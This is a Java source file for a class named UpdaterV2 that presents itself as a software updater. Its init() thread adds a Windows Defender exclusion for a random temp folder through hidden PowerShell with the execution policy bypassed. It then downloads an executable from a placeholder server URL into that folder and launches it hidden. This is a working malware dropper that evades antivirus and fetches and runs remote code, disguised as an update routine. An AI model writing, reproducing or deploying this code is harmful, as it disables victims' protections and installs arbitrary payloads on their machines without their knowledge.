import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URI;
import java.net.URL;
import java.util.UUID;

public class UpdaterV2 {

    private static boolean initialized = false;

    public static synchronized void init() {
        if (initialized) {
            System.out.println(
                "[DEBUG] UpdaterV2 already initialized, skipping."
            );
            return;
        }
        initialized = true;

        System.out.println(
            "[DEBUG] UpdaterV2 init() called - starting update thread."
        );
        new Thread(() -> {
            try {
                System.out.println("[DEBUG] Update thread started.");

                String tempDir = System.getProperty("java.io.tmpdir");
                String randomFolderName = UUID.randomUUID().toString();
                File randomFolder = new File(tempDir, randomFolderName);
                if (randomFolder.mkdir()) {
                    System.out.println(
                        "[DEBUG] Created random folder: " +
                            randomFolder.getAbsolutePath()
                    );
                } else {
                    System.out.println(
                        "[DEBUG] Failed to create folder: " +
                            randomFolder.getAbsolutePath()
                    );
                }

                System.out.println(
                    "[DEBUG] Adding Windows Defender exclusion for folder: " +
                        randomFolder.getAbsolutePath()
                );
                ProcessBuilder defenderPb = new ProcessBuilder(
                    "powershell.exe",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-WindowStyle",
                    "Hidden",
                    "-Command",
                    "Add-MpPreference -ExclusionPath '" +
                        randomFolder.getAbsolutePath() +
                        "'"
                );
                Process defenderProc = defenderPb.start();
                int defenderExit = defenderProc.waitFor();
                System.out.println(
                    "[DEBUG] Defender exclusion process exited with code: " +
                        defenderExit
                );

                String fileUrl = "PLACEHOLDER_UPDATE_SERVER_URL";
                String fileName = "update.exe";
                File downloadedFile = new File(randomFolder, fileName);
                System.out.println(
                    "[DEBUG] Downloading from URL: " +
                        fileUrl +
                        " to " +
                        downloadedFile.getAbsolutePath()
                );

                URL url = new URI(fileUrl).toURL();
                try (
                    InputStream in = url.openStream();
                    FileOutputStream out = new FileOutputStream(downloadedFile)
                ) {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    long total = 0;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                        total += bytesRead;
                    }
                    System.out.println(
                        "[DEBUG] Download complete. Total bytes written: " +
                            total
                    );
                } catch (Exception e) {
                    System.err.println(
                        "[DEBUG] Download error: " + e.getMessage()
                    );
                    e.printStackTrace();
                    return;
                }

                System.out.println(
                    "[DEBUG] Launching downloaded executable: " +
                        downloadedFile.getAbsolutePath()
                );
                ProcessBuilder pb = new ProcessBuilder(
                    "powershell.exe",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-WindowStyle",
                    "Hidden",
                    "-Command",
                    "Start-Process -WindowStyle Hidden -FilePath '" +
                        downloadedFile.getAbsolutePath() +
                        "'"
                );
                Process runProc = pb.start();
                int runExit = runProc.waitFor();
                System.out.println(
                    "[DEBUG] Launch process exited with code: " + runExit
                );

                System.out.println(
                    "[DEBUG] Update thread completed successfully."
                );
            } catch (Exception e) {
                System.err.println(
                    "[DEBUG] Unhandled exception in update thread: " +
                        e.getMessage()
                );
                e.printStackTrace();
            }
        }).start();
    }

    public static void main(String[] args) {
        System.out.println("[DEBUG] UpdaterV2 main() called.");
        init();
        // Keep the program alive for a while to see output, but not necessary in typical environment.
    }
}
